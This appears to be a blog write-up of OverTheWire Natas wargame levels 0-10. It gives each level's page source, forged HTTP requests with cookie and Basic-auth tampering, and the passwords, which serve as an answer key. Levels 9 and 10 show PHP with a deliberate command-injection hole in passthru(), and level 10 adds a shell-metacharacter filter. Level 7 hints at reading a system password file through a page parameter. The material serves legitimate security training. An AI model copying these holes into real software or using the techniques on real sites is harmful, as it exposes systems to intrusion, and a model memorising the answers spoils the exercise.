---
layout: single
title: "OverTheWire: 'Natas' Solutions 1-10"
header:
  teaser: oth.png
  overlay_image: ZenBGG.png
  caption: "[__OverTheWire__](http://overthewire.org/wargames/)"
related: true
comments: true
---

Web Hacking; one of the most dangerous attack vectors out on the internet in today's world. Web Hackers have gotten away with millions of user accounts and passwords, credit card information, and even social security numbers! 

You might wonder how this is even possible?! But we need to understand, that many websites such as Facebook, Google, and even Amazon, store all your information in SQL Databases. These databases are connected to the web servers, allowing them to process user transactions, login requests, and a countless amount of other things! These servers also handle user encryption, session keys, etc. One coding mistake; allowing a malicious attacker to inject SQL code into a query, or even inject special characters into a form, or the URL, can be devastating!

Today, White Hat Hackers (Penetration Testers) must be well versed in many disciplines including web hacking and secure coding, allowing them to find web vulnerabilities and coding exploits that could cause a loss of confidential data. From this, they provide companies information on how to secure their code, and websites to prevent such devastating attacks. 

Today, I will be going over __Natas__, which can be found at [OverTheWire]( http://overthewire.org/wargames/natas/). __Natas__ is here to help teach the basics of server side-web-security, ranging from Replay Attacks, Header Manipulation, Directory Traversal, etc.

Each level of Natas consists of its own website located at __http://natasX.natas.labs.overthewire.org__, where X is the level number. Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. __All passwords are also stored in /etc/natas_webpass/__.

So, let's begin!

### Level 0:
Since we are not using SSH, we will be using a web browser for this. Let's open up a browser and login to Natas0 by going to __http://natas0.natas.labs.overthewire.org__ and useing the username: __natas0__ and the password: __natas0__.

```html
<body>
<h1>natas0</h1>
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
</div>
</body>
```

### Level 1:

```html
<div id="content">
You can find the password for the next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
</div>
```

### Level 2:

```html
<body>
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
</body>
```

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

### Level 3:

```html
<body>
<h1>natas3</h1>
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
</body>
```

```
User-agent: *
Disallow: /s3cr3t/
```

```
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

### Level 4:

```html
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas4.natas.labs.overthewire.org/
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
Connection: close
```

`iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`

### Level 5:

```html
GET /index.php HTTP/1.1
Host: natas5.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: loggedin=0
Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
Connection: close
Cache-Control: max-age=0
```

`aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`

### Level 6:

```php

<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

`7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`


### Level 7:

```html
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the front page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
```

`DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe `

### Level 8:

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

```console
root@kali:`# php -a
Interactive mode enabled

php > echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
oubWYf2kBq
```

`W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`

### Level 9:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

`nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

### Level 10:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

`U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`
